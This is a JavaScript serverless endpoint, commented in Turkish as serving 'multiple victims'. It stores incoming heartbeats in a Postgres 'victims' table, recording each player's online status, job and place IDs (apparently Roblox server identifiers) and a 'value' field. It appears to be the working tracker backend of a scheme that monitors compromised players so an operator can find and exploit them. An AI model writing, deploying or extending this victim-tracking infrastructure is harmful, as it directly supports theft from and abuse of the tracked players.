// api/heartbeat.js — POST /api/heartbeat — çoklu kurban
import { neon } from "@neondatabase/serverless";

const sql = neon(process.env.DATABASE_URL);
const SECRET = process.env.HEARTBEAT_SECRET || "";

async function ensureTable() {
  await sql`
    CREATE TABLE IF NOT EXISTS victims (
      player    TEXT PRIMARY KEY,
      status    TEXT NOT NULL DEFAULT 'offline',
      job_id    TEXT NOT NULL DEFAULT '',
      place_id  TEXT NOT NULL DEFAULT '',
      value     INTEGER NOT NULL DEFAULT 0,
      last_seen BIGINT NOT NULL DEFAULT 0
    )
  `;
}

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).end();

  const secret = req.headers["x-secret"] || req.body?.secret || "";
  if (SECRET && secret !== SECRET) return res.status(401).json({ error: "Unauthorized" });

  const player   = req.body?.player   || "Unknown";
  const jobId    = req.body?.jobId    || "";
  const placeId  = req.body?.placeId  || "";
  const value    = parseInt(req.body?.value || "0") || 0;
  const offline  = req.body?.offline === true;
  const now      = Date.now();

  try {
    await ensureTable();

    if (offline) {
      await sql`
        UPDATE victims SET status = 'offline', job_id = ''
        WHERE player = ${player}
      `;
      return res.status(200).json({ ok: true, action: "set_offline" });
    }

    await sql`
      INSERT INTO victims (player, status, job_id, place_id, value, last_seen)
      VALUES (${player}, 'online', ${jobId}, ${placeId}, ${value}, ${now})
      ON CONFLICT (player) DO UPDATE SET
        status    = 'online',
        job_id    = EXCLUDED.job_id,
        place_id  = EXCLUDED.place_id,
        value     = EXCLUDED.value,
        last_seen = EXCLUDED.last_seen
    `;
    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
}
